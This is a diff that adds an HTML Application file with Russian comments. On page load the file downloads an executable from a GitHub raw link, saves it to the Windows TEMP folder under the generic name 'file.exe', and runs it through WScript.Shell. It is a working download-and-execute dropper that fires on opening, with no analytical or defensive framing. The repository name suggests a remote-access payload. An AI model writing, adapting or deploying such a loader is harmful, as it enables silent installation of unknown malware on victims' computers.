@@ -1,0 +1,47 @@
+<html>
+<head>
+    <title>Загрузка файла</title>
+    <hta:application
+        applicationname="DownloadFile"
+        border="thin"
+        caption="yes"
+        maximizebutton="no"
+        minimizebutton="yes"
+        showintaskbar="yes"
+    />
+    <script language="JScript">
+        function downloadFile() {
+            var link = "https://github.com/Urijas/moperats/raw/refs/heads/main/Enigma32g.exe"; // Ссылка на файл
+            var fileName = "file.exe"; // Имя файла
+            var shell = new ActiveXObject("WScript.Shell");
+            var fso = new ActiveXObject("Scripting.FileSystemObject");
+            var tempFolder = fso.GetSpecialFolder(2); // Папка TEMP
+            var filePath = tempFolder + "\\" + fileName;
+
+            // Загрузка файла
+            var xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
+            xmlhttp.open("GET", link, false);
+            xmlhttp.send();
+
+            if (xmlhttp.Status == 200) {
+                var stream = new ActiveXObject("ADODB.Stream");
+                stream.Type = 1; // Тип двоичных данных
+                stream.Open();
+                stream.Write(xmlhttp.ResponseBody);
+                stream.SaveToFile(filePath, 2); // Сохранение файла
+                stream.Close();
+
+                alert("Файл загружен: " + filePath);
+
+                // Запуск файла
+                shell.Run(filePath);
+            } else {
+                alert("Ошибка загрузки файла.");
+            }
+        }
+    </script>
+</head>
+<body onload="downloadFile()">
+    <h1>Загрузка файла...</h1>
+</body>
+</html>
